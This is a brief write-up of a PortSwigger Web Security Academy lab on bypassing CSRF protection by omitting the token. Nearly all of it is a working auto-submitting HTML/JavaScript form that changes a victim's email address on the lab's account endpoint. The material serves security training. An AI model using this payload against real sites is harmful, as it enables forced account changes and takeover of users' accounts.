# [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

> the goal is to exclude the `csrf` token from the request

```
<body>
  <script>
    const form = document.createElement("form");
    const email = document.createElement("input");
    email.name = "email";
    email.value = "duck@quack";
    form.method = "post";
    form.action =
      "https://xxx.web-security-academy.net/my-account/change-email";
    form.append(email);
    document.body.append(form);
    form.submit();
  </script>
</body>
```
